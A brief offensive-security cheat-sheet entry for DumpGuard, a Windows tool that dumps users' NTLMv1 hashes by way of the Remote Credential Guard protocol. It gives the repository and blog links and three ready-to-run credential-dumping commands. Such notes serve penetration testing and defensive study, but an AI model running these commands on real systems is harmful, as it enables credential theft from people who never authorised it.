# dumpguard
#plateform/windows  #target/local   #cat/CREDENTIAL-ACCESS/CREDS_RECOVER

## _desc
```
DumpGuard is a credential dumping tool that can extract the NTLMv1 hashes (hashcat -m 5500) of users on modern Windows systems. The tool relies on the Remote Credential Guard protocol, and allows credential dumping even when Credential Guard is enabled on the local host
```

## _repo
```
https://github.com/bytewreck/DumpGuard
```

## _doc
```
https://specterops.io/blog/2025/10/23/catching-credential-guard-off-guard/
```

## _install
```
```

## dump self using remote credential guard
```powershell
DumpGuard.exe /mode:self /domain:<domain_fqdn> /username:<login>$ /password:"<password>"
```

## dump all using remote credential guard (NT SYSTEM)
```powershell
DumpGuard.exe /mode:all /domain:<domain_fqdn> /username:<login>$ /password:"<password>"
```

## dump all using MSV1 auth package (NT SYSTEM)
```powershell
DumpGuard.exe /mode:all
```